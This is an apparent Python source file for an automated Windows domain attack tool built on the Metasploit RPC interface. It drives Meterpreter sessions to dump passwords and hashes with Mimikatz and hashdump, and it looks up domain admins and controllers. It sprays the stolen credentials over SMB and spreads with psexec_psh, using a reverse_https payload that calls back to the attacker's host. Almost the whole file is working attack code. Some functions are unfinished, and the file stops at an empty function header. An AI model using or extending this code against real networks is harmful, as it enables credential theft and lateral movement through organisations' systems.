#!/usr/bin/env python3

import re
import os
import sys
import time
import signal
import msfrpc
import string
import random
import asyncio
import argparse
import netifaces
from IPython import embed
from termcolor import colored
from netaddr import IPNetwork, AddrFormatError
from subprocess import Popen, PIPE, CalledProcessError
from libnmap.parser import NmapParser, NmapParserException

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-x", "--xml", help="Path to Nmap XML file")
    parser.add_argument("-p", "--password", default="123", help="Password for msfrpc")
    parser.add_argument("-u", "--username", default="msf", help="Username for msfrpc")
    parser.add_argument("--debug", action="store_true", help="Debug info")
    return parser.parse_args()

def convert_num(num):
    if type(num) == int:
        num = str(num)
    elif type(num) == bytes:
        num = num.decode('utf8')
    return num

# Colored terminal output
def print_bad(msg, label, num):
    if num:
        print(colored('[-] ', 'red') + '{} {} '.format(label, convert_num(num)).ljust(12)+'- '+msg)
    else:
        print(colored('[-] ', 'red') + msg)

def print_info(msg, label, num):
    if num:
        print(colored('[*] ', 'blue') + '{} {} '.format(label, convert_num(num)).ljust(12)+'- '+msg)
    else:
        print(colored('[*] ', 'blue') + msg)

def print_good(msg, label, num):
    if num:
        print(colored('[+] ', 'green') + '{} {} '.format(label, convert_num(num)).ljust(12)+'- '+msg)
    else:
        print(colored('[+] ', 'green') + msg)

def print_great(msg, label, num):
    if num:
        print(colored('[!] ', 'yellow', attrs=['bold']) + '{} {} '.format(label, convert_num(num)).ljust(12)+'- '+msg)
    else:
        print(colored('[!] ', 'yellow') + msg)

def print_debug(msg, label, num):
    if num:
        print(colored('[DEBUG] ', 'cyan') + '{} {} '.format(label, convert_num(num)).ljust(12)+'- '+msg)
    else:
        print(colored('[DEBUG] ', 'cyan') + msg)

def debug_info(output, label, label_num):
    if args.debug:
        if output:
            for l in output.splitlines():
                l = l.decode('utf8')
                print_debug(l, label, label_num)
        else:
            print_debug('Output == None', label, label_num)

def kill_tasks():
    print()
    print_info('Killing tasks then exiting', None, None)
    embed()
    del_unchecked_hosts_files()
    for task in asyncio.Task.all_tasks():
        task.cancel()

def del_unchecked_hosts_files():
    for f in os.listdir():
        if f.startswith('unchecked_hosts-') and f.endswith('.txt'):
            os.remove(f)

def get_local_ip(iface):
    '''
    Gets the the local IP of an interface
    '''
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip


def get_iface():
    '''
    Gets the right interface for Responder
    '''
    try:
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    except:
        ifaces = []
        for iface in netifaces.interfaces():
            # list of ipv4 addrinfo dicts
            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])

            for entry in ipv4s:
                addr = entry.get('addr')
                if not addr:
                    continue
                if not (iface.startswith('lo') or addr.startswith('127.')):
                    ifaces.append(iface)

        iface = ifaces[0]

    return iface

async def run_sysinfo(client, sess_num, sess_data):
    # Sysinfo
    print_info('Getting session data', 'Session', sess_num)

    cmd = 'sysinfo'
    end_strs = [b'Meterpreter     : ']

    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)

    if err:
        print_bad('Session appears to be broken', 'Session', sess_num)
        return [b'ERROR']
    else:
        sysinfo_split = output.splitlines()

    return sysinfo_split

async def run_getuid(client, sess_num, sess_data):
    # getuid
    cmd = 'getuid'
    end_strs = [b'Server username:']

    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
   
    if err:
        print_bad('Session appears to be dead', 'Session', sess_num)
        return [b'ERROR']
    else:
        user = output.split(b'Server username: ')[-1].strip().strip()
        sess_data[sess_num][b'user'] = user
        getuid = b'User            : ' + user
        return getuid

async def get_shell_info(client, sess_num, sess_data):

    sysinfo_split = await run_sysinfo(client, sess_num, sess_data)
    if sysinfo_split == [b'ERROR']:
        return sysinfo_split

    getuid = await run_getuid(client, sess_num, sess_data)
    if getuid == [b'ERROR']:
        return getuid

    shell_info = [getuid] + sysinfo_split

    return shell_info

def get_domain(shell_info):
    for l in shell_info:

        l = l.decode('utf8')

        l_split = l.split(':')
        if 'Domain      ' in l_split[0]:
            if 'WORKGROUP' in l_split[1]:
                return b'no domain'
            else:
                domain = l_split[-1].strip()
                return domain.encode()

def is_domain_joined(user_info, domain):
    if user_info != b'ERROR':
        info_split = user_info.split(b':')
        dom_and_user = info_split[1].strip()
        dom_and_user_split = dom_and_user.split(b'\\')
        dom = dom_and_user_split[0].lower()
        user = dom_and_user_split[1]

        if domain != b'no domain':
            if dom.lower() in domain.lower():
                return b'True'

    return b'False'

def print_shell_data(shell_info, admin_shell, local_admin, sess_num_str):
    print_info('Meterpreter shell info', 'Session', int(sess_num_str))
    for l in shell_info:
        print('        '+l.decode('utf8'))
    msg =  '''        Admin shell     : {}
        Local admin     : {}
        Session number  : {}'''.format(
                              admin_shell.decode('utf8'),
                              local_admin.decode('utf8'),
                              sess_num_str)
    print(msg)

#async def meterpreter_sleep(sess_num, secs):
#    sess_data[sess_num][b'busy'] = b'True'
#    await asyncio.sleep(secs)
#    sess_data[sess_num][b'busy'] = b'False'

async def sess_first_check(client, sess_num, sess_data, domain_data):
    # Give it time to open
    await asyncio.sleep(2)

    if b'first_check' not in sess_data[sess_num]:
        sess_num_str = str(sess_num)
        sess_data[sess_num][b'busy'] = b'False'
        sess_data[sess_num][b'first_check'] = b'False'
        sess_data[sess_num][b'errors'] = []
        sess_data[sess_num][b'session_number'] = sess_num_str.encode()
        ip = sess_data[sess_num][b'tunnel_peer'].split(b':')[0]
        ip_data = b'IP              : '+ip

        print_good('New session {} found'.format(str(sess_num)), 'Session', sess_num)

        # Sleep 2 secs to give meterpeter chance to open
        #await meterpreter_sleep(sess_num, 2)

        # Migrate out of the process
        # Not sure we want this as it'll migrate a domain user with local admin shell into SYSTEM
        #await run_priv_migrate(client, sess_num)

        shell_info = await get_shell_info(client, sess_num, sess_data)
        if shell_info == [b'ERROR']:
            return
        shell_info = [ip_data] + shell_info

        # Get domain info
        domain = get_domain(shell_info)
        sess_data[sess_num][b'domain'] = domain
        sess_data[sess_num][b'domain_joined'] = is_domain_joined(shell_info[1], domain)

        # Update domain_data for domain admins and domain controllers
        await get_DCs_DAs(client, sess_num, sess_data, domain_data)

        # Get shell privileges
        admin_shell, local_admin = await check_privs(client, sess_num, sess_data)

        # Print the new shell's data
        print_shell_data(shell_info, admin_shell, local_admin, sess_num_str)

def parse_pid(output, user, proc):
    for l in output.splitlines():
        l_split = l.strip().split()

        # Normal users can't have spaces but we need to make exception for NT AUTHORITY
        if user.lower() == b'nt authority\\system':
            nt = b'NT'
            auth = b'AUTHORITY\\SYSTEM'
            if nt in l_split and auth in l_split:
                nt_offset = l_split.index(nt)
                auth_offset = l_split.index(auth)
                l_split.remove(auth)
                l_split[nt_offset] = nt+b' '+auth

        if proc in l_split and user in l_split:
            pid = l_split[0]
            return pid

#async def migrate_custom_proc(client, sess_num):
#
#    print_info('Migrating to stable process', 'Session', sess_num)
#
#    # Get own pid
#    cmd = 'getpid'
#    end_strs = [b'Current pid: ']
#    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
#    if err:
#        return err
#    cur_pid = output.split(end_strs[0])[1].strip()
#
#    # Get stable proc's pid
#    cmd = 'ps'
#    end_strs = [b' PID    PPID']
#    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
#    if err:
#        return err
#    user = sess_data[sess_num][b'user']
#    proc = b'explorer.exe'
#    pid = parse_pid(output, user, proc)
#    # In case user is NT AUTHORITY\\SYSTEM which has no explorer.exe
#    if not pid:
#        proc = b'lsass.exe'
#        pid = parse_pid(output, user, proc)
#
#    # When a session dies in this function its usually here that it errors out
#    if not pid:
#        msg = 'No migration PID found likely due to abrupt death of session'
#        print_bad(msg, 'Session', sess_num)
#        sess_data[sess_num][b'errors'].append(msg)
#        return msg
#
#    # If we're not already in the pid then migrate
#    if pid != cur_pid:
#        # Migrate to pid
#        cmd = 'migrate '+pid.decode('utf8')
#        end_strs = [b'Migration completed successfully.',
#                    b'Session is already in target process',
#                    b'[+] Already in',
#                    b'[+] Successfully migrated to']
#        output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
#
#async def run_priv_migrate(client, sess_num):
#    print_info('Migrating to similar privilege process', 'Session', sess_num)
#    cmd = 'run post/windows/manage/priv_migrate'
#    end_strs = [b'Migration completed successfully.',
#                b'Session is already in target process',
#                b'[+] Already in',
#                b'[+] Successfully migrated to']
#    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
#    if err:
#        return err

async def check_privs(client, sess_num, sess_data):

    cmd = 'run post/windows/gather/win_privs'
    end_strs = [b'==================']

    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    if err:
        admin_shell = b'ERROR'
        local_admin = b'ERROR'

    else:
        split_out = output.splitlines()

        # Sometimes gets extra output from priv_migrate in this output
        offset = 5
        for num,l in enumerate(split_out):
            if b'True' in l or b'False' in l:
                offset = num

        user_info_list = split_out[offset].split()
        system = user_info_list[1]
        user = user_info_list[5]
        admin_shell = user_info_list[0]
        local_admin = user_info_list[2]

    sess_data[sess_num][b'admin_shell'] = admin_shell
    sess_data[sess_num][b'local_admin'] = local_admin

    return (admin_shell, local_admin)

async def get_domain_controllers(client, sess_num, sess_data, domain_data):
    print_info('Getting domain controller', 'Session', sess_num)
    cmd = 'run post/windows/gather/enum_domains'
    end_strs = [b'[+] Domain Controller:']

    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    if err:
        return

    output = output.decode('utf8')
    if 'Domain Controller: ' in output:
        dc = output.split('Domain Controller: ')[-1].strip()
        if dc not in domain_data['domain_controllers']:
            domain_data['domain_controllers'].append(dc)
            print_info('Domain controller: '+dc, 'Session', sess_num)

async def get_domain_admins(client, sess_num, sess_data, domain_data, ran_once):
    print_info('Getting domain admins', 'Session', sess_num)
    cmd = 'run post/windows/gather/enum_domain_group_users GROUP="Domain Admins"'
    end_strs = [b'[+] User list']

    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    if err:
        return

    output = output.decode('utf8')
    da_line_start = '[*] \t'

    if da_line_start in output:
        split_output = output.splitlines()

        domain_admins = []
        for l in split_output:
            if l.startswith(da_line_start):
                domain_admin = l.split(da_line_start)[-1].strip()
                if len(domain_admin) > 0:
                    # lowercase the domain
                    dom = domain_admin.split('\\')[0].lower()
                    user = domain_admin.split('\\')[1]
                    domain_admin = dom+'\\'+user
                    domain_admins.append(domain_admin)

        for x in domain_admins:
            if x not in domain_data['domain_admins']:
                print_info('Domain admin: '+x, 'Session', sess_num)
                domain_data['domain_admins'].append(x)

    # If we don't get any DAs from the shell we try one more time
    else:
        if ran_once:
            print_bad('No domain admins found', 'Session', sess_num)
        else:
            print_bad('No domain admins found, trying one more time', 'Session', sess_num)
            ran_once = True
            await get_domain_admins(client, sess_num, sess_data, domain_data, ran_once)

async def get_DCs_DAs(client, sess_num, sess_data, domain_data):
    # Update domain data
    if b'domain' in sess_data[sess_num]:
        domain_data['domain'] = sess_data[sess_num][b'domain'].decode('utf8').lower()

    if len(domain_data['domain_admins']) == 0:
        run_once = False
        await get_domain_admins(client, sess_num, sess_data, domain_data, run_once)
    if len(domain_data['domain_controllers']) == 0:
        await get_domain_controllers(client, sess_num, sess_data, domain_data)

def update_session(msf_sess, msf_sess_num, sess_data):

    if msf_sess_num in sess_data:
        # Update session with the new key:value's in sess_data
        # This will not change any of the MSF session data, just add new key:value pairs
        sess_data[msf_sess_num] = add_session_keys(msf_sess, sess_data, msf_sess_num)
    else:
        sess_data[msf_sess_num] = msf_sess

#async def run_userhunter(client, sess_num):
#    plugin = 'powershell'
#    output, err = await load_met_plugin(client, sess_num, plugin)
#    if err:
#        return
#
#    script_path = os.getcwd()+'/scripts/powerview.ps1'
#    output, err = await import_powershell(client, sess_num, script_path)
#    if err:
#        return
#
#    ps_cmd = 'Find-DomainUser'
#    output, err = await run_powershell_cmd(client, sess_num, ps_cmd)
#    if err:
#        return
#
#async def import_powershell(client, sess_num, script_path):
#    cmd = 'powershell_import '+ script_path
#    end_strs = [b'File successfully imported.']
#    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
#    return (output, err)
#
#async def run_powershell_cmd(client, sess_num, ps_cmd):
#    cmd = 'powershell_execute'+ ps_cmd
#    end_strs = [b'Command execution completed:']
#    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
#    return (output, err)

async def load_met_plugin(client, sess_num, sess_data, plugin):
    cmd = 'load '+plugin
    end_strs = [b'Success.', b'has already been loaded.']
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    return (output, err)

async def run_mimikatz(client, sess_num, sess_data, domain_data):
    plugin = 'mimikatz'
    output, err = await load_met_plugin(client, sess_num, sess_data, plugin)
    if err:
        return

    cmd = 'wdigest'
    end_strs = [b'    Password']
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    if err:
        return

    mimikatz_split = output.splitlines()
    for l in mimikatz_split:

        if l.startswith(b'0;'):
            line_split = l.split(None, 4)

            # Output may include accounts without a password?
            # Here's what I've seen that causes problems:
            #ob'AuthID        Package    Domain        User               Password'
            #b'------        -------    ------        ----               --------'
            #b'0;1299212671  Negotiate  IIS APPPOOL   DefaultAppPool     '
            #b'0;995         Negotiate  NT AUTHORITY  IUSR               '
            #b'0;997         Negotiate  NT AUTHORITY  LOCAL SERVICE      '
            #b'0;41167       NTLM                                        '

            if len(line_split) < 5:
                continue

            dom = line_split[2].lower()
            if dom.lower() == sess_data[sess_num][b'domain'].lower():
                dom_user = '{}\\{}'.format(dom.decode('utf8').lower(), line_split[3].decode('utf8'))
                password = line_split[4]

                # Check if it's just some hex shit that we can't use
                if password.count(b' ') > 200:
                    continue

                if b'wdigest KO' not in password:
                    creds = '{}:{}'.format(dom_user, password.decode('utf8'))
                    if creds not in domain_data['creds']:
                        domain_data['creds'].append(creds)
                        msg = 'Creds found through Mimikatz: '+creds
                        print_great(msg, 'Session', sess_num)
                        await check_for_DA(creds)

async def check_creds_against_DC(client, sess_num, creds, plaintext):
    cred_split = creds.split(':')
    user = cred_split[0]
    pw = cred_split[1]
    pass
########### finish this eventually

async def check_for_DA(creds):

    da_creds = False

    if '\\'in creds:
        username_pw = creds.split('\\')[1]
        username = username_pw.split(':')[0]
        if len([da for da in domain_data['domain_admins'] if username in da]) > 0:
            print_great('Potential domain admin found! '+creds, None, None)

    # Got dom\user:pw
    if creds in domain_data['domain_admins']:
        print_great('Potential domain admin found! '+creds, None, None)
        da_creds = True
        plaintext = True

    # Got a hash
    elif creds.count(':') == 6 and creds.endswith(':::'):
        hash_split = creds.split(':')
        user = hash_split[0]
        rid = hash_split[1]
        lm = hash_split[2]
        ntlm = hash_split[3]
        for c in domain_data['domain_admins']:
            da_user_pw = c.split('\\')[1]
            da_user = da_user_pw.split(':')[0]
            creds = da_user+':'+ntlm
            if user.lower() == da_user.lower():
                msg = 'Potential domain admin found! '+creds
                print_good(msg, 'Session', sess_num)
                da_creds = True
                plaintext = False

    if da_creds:
        if len(domain_data['domain_controllers']) > 0:
            creds_worked = await check_creds_against_DC(client, sess_num, creds, plaintext)
            if creds_worked:
                print_great('Confirmed domain admin! '+creds, 'Session', sess_num)

async def get_passwords(client, sess_num, sess_data, domain_data):
    await run_mimikatz(client, sess_num, sess_data, domain_data)
    await run_hashdump(client, sess_num, sess_data, domain_data)
    #mimikittenz

async def run_hashdump(client, sess_num, sess_data, domain_data):
    cmd = 'hashdump'
    end_strs = None
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    if err:
        return

    for l in output.splitlines():
        l = l.strip().decode('utf8')
        if l not in domain_data['creds']:
            domain_data['creds'].append(l)
            msg = 'Hashdump creds - '+l
            print_great(msg, 'Session', sess_num)

def get_console_ids(client):
    c_ids = [x[b'id'] for x in client.call('console.list')[b'consoles']]

    print_info('Opening Metasploit consoles', None, None)
    while len(c_ids) < 5:
        client.call('console.create')
        c_ids = [x[b'id'] for x in client.call('console.list')[b'consoles']] # Wait for response
        time.sleep(2)

    for c_id in c_ids:
        client.call('console.read', [c_id])[b'data'].decode('utf8').splitlines()

    return c_ids

async def run_msf_module(client, c_id, mod, rhost_var, target_ips, lhost, extra_opts, start_cmd, end_strs):

    payload = 'windows/x64/meterpreter/reverse_https'
    cmd = create_msf_cmd(mod, rhost_var, target_ips, lhost, payload, extra_opts, start_cmd)
    mod_out = await run_console_cmd(client, c_id, cmd, end_strs)

    return (cmd, mod_out)

def create_msf_cmd(module_path, rhost_var, target_ips, lhost, payload, extra_opts, start_cmd):
    cmds = ('use {}\n'
            'set {} {}\n'
            'set LHOST {}\n'
            'set payload {}\n'
            '{}\n'
            '{}\n').format(module_path, rhost_var, target_ips, lhost, payload, extra_opts, start_cmd)

    return cmds

async def run_console_cmd(client, c_id, cmd, end_strs):
    '''
    Runs module and gets output
    '''
    cmd_split = cmd.splitlines()
    module = cmd_split[0].split()[1]
    print_info('Running MSF module [{}]'.format(module), 'Console', c_id)
    client.call('console.write',[c_id, cmd])
    output = await get_console_output(client, c_id, end_strs)
    err = get_output_errors(output, cmd)
    if err:
        print_bad(err, 'Console', c_id)
        return

    return output

async def get_console_output(client, c_id, end_strs, timeout=240):
    '''
    The only way to get console busy status is through console.read or console.list
    console.read clears the output buffer so you gotta use console.list
    but console.list requires you know the list offset of the c_id console
    so this ridiculous list comprehension seems necessary to avoid assuming
    what the right list offset might be
    '''
    counter = 0
    sleep_secs = 1
    list_offset = int([x[b'id'] for x in client.call('console.list')[b'consoles'] if x[b'id'] is c_id][0])
    output = b''

    # Give it a chance to start
    await asyncio.sleep(sleep_secs)

    # Get any initial output
    output += client.call('console.read', [c_id])[b'data']

    while client.call('console.list')[b'consoles'][list_offset][b'busy'] == True:
        output += client.call('console.read', [c_id])[b'data']
        await asyncio.sleep(sleep_secs)
        counter += sleep_secs

    while True:
        output += client.call('console.read', [c_id])[b'data']

        if end_strs:
            if any(end_strs in output for end_strs in end_strs):
                break

        if counter > timeout:
            break

        await asyncio.sleep(sleep_secs)
        counter += sleep_secs

    # Get remaining output
    output += client.call('console.read', [c_id])[b'data']

    debug_info(output, 'Console', c_id)

    return output

async def get_nonbusy_cid(client, c_ids):
    while True:
        for c_id in c_ids:
            list_offset = int([x[b'id'] for x in client.call('console.list')[b'consoles'] if x[b'id'] is c_id][0])
            if client.call('console.list')[b'consoles'][list_offset][b'busy'] == False:
                return c_id
        await asyncio.sleep(1)

def plaintext_or_hash(creds):
    if creds.count(':') == 6 and creds.endswith(':::'):
        return 'hash'
    else:
        return 'plaintext'

def parse_creds(creds, cred_type):
    if cred_type == 'hash':
        hash_split = creds.split(':')
        rid = hash_split[1]
        user = hash_split[0]
        lm = hash_split[2]
        ntlm = hash_split[3] # ntlm hash
        pwd = lm+':'+ntlm    # need lm:ntlm for PTH in metasploit
        dom = '.'            # this also means WORKGROUP or non-domain login in msf

    elif cred_type == 'plaintext':
        cred_split = creds.split(':')
        user = cred_split[0]
        # Remove domain from user
        if "\\" in user:
            user = user.split("\\")[1]
        pwd = cred_split[1]
        dom = domain_data['domain'].lower()
        rid = None

    return dom, user, pwd, rid


async def spread(lock, client, c_ids, lhost, sess_data, domain_data):

    while True:
        # Copy the dict so we can loop it safely
        dom_data_copy = domain_data.copy()

        for c in dom_data_copy['creds']:
            if c not in dom_data_copy['checked_creds']:
                # Set up a dict where the key is the creds and the val are the hosts we are admin on
                dom_data_copy['checked_creds'][c] = []
                await run_smb_brute(lock, client, c_ids, lhost, c, sess_data, domain_data, dom_data_copy)

        print('GETTING NEW SHELL')####
        await get_new_shells(lock, client, c_ids, lhost, sess_data, domain_data, dom_data_copy)

        await asyncio.sleep(1)

async def run_smb_brute(lock, client, c_ids, lhost, creds, sess_data, domain_data, dom_data_copy):
    cred_type = plaintext_or_hash(creds)
    dom, user, pwd, rid = parse_creds(creds, cred_type)

    # Just smb brute with rid 500 for now
    if cred_type == 'hash' and rid != '500':
        return

    mod = 'auxiliary/scanner/smb/smb_login'
    rhost_var = 'RHOSTS'
    start_cmd = 'run'
    target_ips = create_hostsfile(creds, dom_data_copy)
    extra_opts = ('set threads 32\n'
                  'set smbuser {}\n'
                  'set smbpass {}\n'
                  'set smbdomain {}'.format(user, pwd, dom))
    end_strs = [b'Auxiliary module execution completed']

    c_id = await get_nonbusy_cid(client, c_ids)
    print_info('Spraying credentials [{}:{}] against hosts'.format(user, pwd), 'Console', c_id)
    cmd, output = await run_msf_module(client, c_id, mod, rhost_var, target_ips, lhost, extra_opts, start_cmd, end_strs)
    await parse_module_output(lock, c_id, cmd, output, domain_data)

async def get_new_shells(lock, client, c_ids, lhost, sess_data, domain_data, dom_data_copy):

    # Get all session IPs and figure out if they're admin shells so we don't overlap our spread
    session_ips = {}
    with await lock:
        for sess_num in sess_data:
            if b'admin_shell' not in sess_data[sess_num]:
                continue
            ip = sess_data[sess_num][b'tunnel_peer'].split(b':')[0]
            admin_shell = sess_data[sess_num][b'admin_shell']
            session_ips[ip] = admin_shell

    # run psexec_psh on all ips that we either don't have a shell on already or don't have an admin shell on
    # dom_data_copy['checked_creds']['LAB\\dan:P@ssw0rd'] = [list of ips we have admin for those creds]
    for creds in dom_data_copy['checked_creds']:
        for admin_ip in dom_data_copy['checked_creds'][creds]:
            bytes_admin_ip = admin_ip.encode()
            if bytes_admin_ip in session_ips:
                if session_ips[bytes_admin_ip] == b'False' or session_ips[bytes_admin_ip] == b'ERROR':
                    await run_psexec_psh(lock, client, c_ids, creds, admin_ip, lhost, domain_data)
            else:
                await run_psexec_psh(lock, client, c_ids, creds, admin_ip, lhost, domain_data)

async def run_psexec_psh(lock, client, c_ids, creds, ip, lhost, domain_data):
    cred_type = plaintext_or_hash(creds)
    dom, user, pwd, rid = parse_creds(creds, cred_type)

    # Skip non-RID 500 local logins for now
    # Move this later on so we can PTH of domain admins we find - debug
    if dom == '.':
        if rid != '500':
            return

    mod = 'exploit/windows/smb/psexec_psh'
    rhost_var = 'RHOST'
    start_cmd = 'exploit -z'
    extra_opts = ('set smbuser {}\n'
                  'set smbpass {}\n'
                  'set smbdomain {}'.format(user, pwd, dom))
    end_strs = [b'[*] Meterpreter session ']

    c_id = await get_nonbusy_cid(client, c_ids)
    print_info('Performing lateral movement with credentials [{}:{}] against host [{}]'.format(user, pwd, ip), 'Console', c_id)
    cmd, output = await run_msf_module(client, c_id, mod, rhost_var, ip, lhost, extra_opts, start_cmd, end_strs)
    await parse_module_output(lock, c_id, cmd, output, domain_data)

async def parse_module_output(lock, c_id, cmd, output, domain_data):
    if output:
        if 'smb_login' in cmd:
            await parse_smb_login(lock, c_id, output, domain_data)
        elif 'psexec_psh' in cmd:
            await parse_psexec_psh(c_id, output)

async def parse_psexec_psh(c_id, output):
    user = None
    for l in output.splitlines():
        l = l.strip().decode('utf8')
        if 'smbuser =>' in l:
            user = l.split()[-1]
        if '[*] Meterpreter session ' in l:
            l_split = l.split()
            ip = l_split[7][:-1].split(':')[0]
            print_good('Successfully opened new shell with admin [{}] on [{}]'.format(user, ip), 'Console', c_id)

            # Wait for it to completely open so we don't redo the same shell
            await asyncio.sleep(5)

async def create_user_pwd_creds(lock, user, pwd, dom, domain_data):
    '''Parse out the username and domain
    When PTH with RID 500, the domain will just say "."
    user_pwd is what we print, creds is what we use in domain_data
    This is necessary to preserve hashdumped creds' RID number'''
    if dom != '.':
        dom_user = dom+'\\'+user
        creds = dom_user+':'+pwd
        user_pwd = creds

    # PTH user
    else:
        with await lock:
            for c in domain_data['checked_creds']:
                if user in c and pwd in c:
                    user_pwd = user+':'+pwd
                    creds = c

    return user_pwd, creds

async def parse_smb_login(lock, c_id, output, domain_data):

    user = None
    pwd = None
    dom = None
    user_pwd = None
    creds = None
    admin_found = False

    out_split = output.splitlines()
    for l in out_split:
        l = l.strip().decode('utf8')

        if 'smbuser' in l:
            user = l.split()[-1]
        if 'smbpass' in l:
            pwd = l.split()[-1]
        if 'smbdomain' in l:
            dom = l.split()[-1].lower()

        if user and pwd and dom:
            user_pwd, creds = await create_user_pwd_creds(lock, user, pwd, dom, domain_data)

        if '- Success: ' in l:

            if not creds:
                print_bad('Found successful login, but unable to parse domain, user and password', 'Console', c_id)
                print_bad('    '+l, 'Console', c_id)

            ip_port = l.split()[1]
            ip = ip_port.split(':')[0]
            admin_str = "' Administrator"
            if l.endswith(admin_str):

                # IP will only be in there if the creds are admin on the box
                if ip in domain_data['checked_creds'][creds]:
                    continue

                domain_data['checked_creds'][creds].append(ip)
                print_good('Admin login found! [{} - {}]'.format(ip, user_pwd), 'Console', c_id)
                admin_found = True

            else:
                print_info('Non-admin login found [{} - {}]'.format(ip, user_pwd), 'Console', c_id)

    if not admin_found:
        if user_pwd:
            print_bad('No admin logins found with [{}]'.format(user_pwd), 'Console', c_id)
        else:
            print_bad('Failed to parse smb_login output', 'Console', c_id)

def create_hostsfile(c, dom_data_copy):

    identifier = ''.join(random.choice(string.ascii_letters) for x in range(7))
    filename = 'unchecked_hosts-{}.txt'.format(identifier)
    with open(filename, 'w') as f:
        for ip in dom_data_copy['hosts']:
            f.write(ip+'\n')

    return 'file:'+os.getcwd()+'/'+filename

async def attack(client, sess_num, sess_data, domain_data):

    # Is admin
    if sess_data[sess_num][b'admin_shell'] == b'True':
        # mimikatz, spray, PTH RID 500
        await get_passwords(client, sess_num, sess_data, domain_data)

    # Not admin
    elif sess_data[sess_num][b'admin_shell'] == b'False':
        # Domain joined

        if sess_data[sess_num][b'local_admin'] == b'False':
            # Give up
            pass

    # START ATTACKING! FINALLY!
    # not domain joined and not admin
        # fuck it?
    # not domain joined but admin
        # mimikatz
    # domain joined and not admin
        # GPP privesc
        # Check for seimpersonate
        # Check for dcsync
        # userhunter
        # spray and pray
    # domain joined and admin
        # GPP
        # userhunter
        # spray and pray



def get_output(client, cmd, sess_num, error_msg):
    sess_num_str = str(sess_num)
    output = client.call('session.meterpreter_read', [sess_num_str])

    # Everythings fine
    if b'data' in output:
        return (output[b'data'], None)

    # Got an error from the client.call
    elif b'error_message' in output:
        decoded_err = output[b'error_message'].decode('utf8')
        print_bad(error_msg.format(sess_num_str, decoded_err), 'Session', sess_num)
        return (None, decoded_err)

    # Some other error catchall
    else:
        return (None, cmd)

def get_output_errors(output, cmd):

    script_errors = [b'[-] post failed',
                     b'error in script',
                     b'operation failed',
                     b'unknown command',
                     b'operation timed out',
                     b'unknown session id',
                     b'error running',
                     b'failed to load extension',
                     b'requesterror',
                     b'is not a valid option for this module',
                     b'exploit failed: rex::')
    err = None

    # Got an error from output
    if any(x in output.lower() for x in script_errors):
        # Sometimes meterpreter spits out the same error over multiple lines
#        out_splitline = output.splitlines()
#        if len(out_splitline) > 1:
#            output = out_splitline[0]

        err = 'Command [{}] failed with error: {}'.format(cmd, output.decode('utf8').strip())

    return err

async def run_session_cmd(client, sess_num, sess_data, cmd, end_strs, timeout=240):

    err = None
    output = None
    error_msg = 'Error in session {}: {}'
    sess_num_str = str(sess_num)

    print_info('Running [{}]'.format(cmd), 'Session', sess_num)

    while sess_data[sess_num][b'busy'] == b'True':
        await asyncio.sleep(1)

    sess_data[sess_num][b'busy'] = b'True'

    res = client.call('session.meterpreter_run_single', [str(sess_num), cmd])

    # Error from MSF API
    if b'error_message' in res:
        err_msg = res[b'error_message'].decode('utf8')
        print_bad(error_msg.format(sess_num_str, err_msg), 'Session', sess_num)
        sess_data[sess_num][b'errors'].append(err_msg)
        sess_data[sess_num][b'busy'] = b'False'
        return (None, err_msg)

    # Successfuly completed MSF API call
    elif res[b'result'] == b'success':

        counter = 0
        sleep_secs = 1
        full_output = b''

        try:
            while True:
                await asyncio.sleep(sleep_secs)

                output, err = get_output(client, cmd, sess_num, error_msg)
                if output:
                    full_output += output

                # Error from meterpreter console
                if err:
                    sess_data[sess_num][b'errors'].append(err)
                    print_bad('Meterpreter error: {}'.format(err), 'Session', sess_num)
                    break

                # Check for errors from cmd's output
                err = get_output_errors(full_output, cmd)
                if err:
                    sess_data[sess_num][b'errors'].append(err)
                    print_bad(err, 'Session', sess_num)
                    break

                # If no terminating string specified just wait til timeout
                counter += sleep_secs
                if counter > timeout:
                    err = 'Command [{}] timed out'.format(cmd)
                    sess_data[sess_num][b'errors'].append(err)
                    print_bad(err, 'Session', sess_num)
                    break

                # Successfully completed
                if end_strs:
                    if any(end_strs in full_output for end_strs in end_strs):
                        break

                # If no end_strs specified just return once we have any data or until timeout
                else:
                    if len(full_output) > 0:
                        break

        # This usually occurs when the session suddenly dies or user quits it
        except Exception as e:
            # Get the last of the data to clear the buffer
            clear_buffer = client.call('session.meterpreter_read', [sess_num_str])
            err = 'exception below likely due to abrupt death of session'
            print_bad(error_msg.format(sess_num_str, err), 'Session', sess_num)
            print_bad('    '+str(e), None, None)
            sess_data[sess_num][b'errors'].append(err)
            sess_data[sess_num][b'busy'] = b'False'
            debug_info(full_output, 'Session', sess_num)
            return (full_output, err)

    # b'result' not in res, b'error_message' not in res, just catch everything else as an error
    else:
        err = res[b'result'].decode('utf8')
        sess_data[sess_num][b'errors'].append(err)
        print_bad(res[b'result'].decode('utf8'), 'Session', sess_num)

    # Get the last of the data to clear the buffer
    clear_buffer = client.call('session.meterpreter_read', [sess_num_str])

    sess_data[sess_num][b'busy'] = b'False'
    debug_info(full_output, 'Session', sess_num)

    return (full_output, err)

def get_perm_token(client):
    # Authenticate and grab a permanent token
    try:
        client.login(args.username, args.password)
    except msfrpc.MsfAuthError:
        print_bad('Authentication to the MSF RPC server failed, are you sure you have the right password?', None, None)
    client.call('auth.token_add', ['123'])
    client.token = '123'
    return client

def is_session_broken(lock, sess_num, sess_data):
